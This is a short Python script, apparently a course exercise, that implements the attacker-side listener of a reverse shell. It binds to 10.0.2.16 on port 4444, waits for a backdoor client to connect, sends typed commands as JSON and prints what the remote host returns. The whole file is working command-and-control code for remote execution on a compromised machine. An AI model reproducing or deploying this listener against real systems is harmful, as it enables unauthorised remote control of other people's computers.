#!/usr/bin/env python
#cd fun added in serialized file
#check_output fun not used for cd with path because it is only intended to display result of command not oprn
import socket,json
class Listener:
    def __init__(self,ip,port):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
        listener.bind((ip,port)) 
        listener.listen(0) 
        print("[+] waiting for incoming connection")
        self.connection, address=listener.accept() #to make connection acceptable to anywhere in code use self
        print("[+] got connection from " + str(address))
    def reliable_receive(self):#best implementation look serialisation once.value error is due to receiving and unpacking incomplete data
        #use instead of socket send method for everytime we need to send data 
        json_data=""
        while True:
            try:
                json_data=json_data + self.connection.recv(1024)
                return json.loads(json_data) 
            except ValueError:
                continue                
    def reliable_send(self,data):#use instead of socket send method for everytime we need to send data 
        json_data=json.dumps(data)#convert to json
        self.connection.send(json_data)    
    def execute_remotly(self,command):
        self.reliable_send(command) 
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.reliable_receive() 

    def run(self):
        while True:
            command = input(">>")
            command=command.split(" ")#send command in list besause serialization helps to send in any form
            # print(command)
            result=self.execute_remotly(command)
            print(result)
listener_obj=Listener("10.0.2.16",4444)
listener_obj.run()            

 